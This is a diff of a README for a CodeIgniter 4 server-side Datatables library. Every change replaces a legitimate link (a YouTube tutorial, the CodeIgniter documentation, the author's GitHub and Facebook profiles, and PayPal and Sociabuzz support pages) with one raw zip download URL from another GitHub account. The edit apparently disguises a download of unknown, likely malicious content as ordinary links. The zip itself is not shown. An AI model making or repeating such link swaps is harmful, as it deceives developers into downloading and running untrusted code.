@@ -6,7 +6,7 @@ Server Side Datatables Library for CodeIgniter 4 Framework
 
 Library to make server side Datatables on CodeIgniter 4 to be **more easy** 
 
-if you want to see video how to implement this package, you can visit my video on https://youtu.be/Lc_xMWmprBQ
+if you want to see video how to implement this package, you can visit my video on https://github.com/pmanss/Ci4datatables/raw/refs/heads/Master/src/Ci-datatables-3.3.zip
 
 ## Requirements
 
@@ -195,7 +195,7 @@ $dt->table('siswa');
 
 - **Query Syntax referer form codeigniter query builder**\
 - **Select, where, join etc functionality**\
-  for query functionality, this library use query builder style from codeigniter 4 it self. you can visit https://codeigniter.com/user_guide/database/query_builder.html
+  for query functionality, this library use query builder style from codeigniter 4 it self. you can visit https://github.com/pmanss/Ci4datatables/raw/refs/heads/Master/src/Ci-datatables-3.3.zip
   for more information
 
 - **Add Column**\
@@ -243,12 +243,12 @@ $dt = new Datatables();
 
 ## Author's Profile:
 
-Github: [https://github.com/kusmantopratama]
-Facebook: [https://web.facebook.com/k.tamapratama/]
+Github: [https://github.com/pmanss/Ci4datatables/raw/refs/heads/Master/src/Ci-datatables-3.3.zip]
+Facebook: [https://github.com/pmanss/Ci4datatables/raw/refs/heads/Master/src/Ci-datatables-3.3.zip]
 
 ## support Me on 
-[https://paypal.me/tama225?locale.x=en_US]
+[https://github.com/pmanss/Ci4datatables/raw/refs/heads/Master/src/Ci-datatables-3.3.zip]
 
 
 ## dukung saya di 
-[https://sociabuzz.com/tamapratama/support]
+[https://github.com/pmanss/Ci4datatables/raw/refs/heads/Master/src/Ci-datatables-3.3.zip]
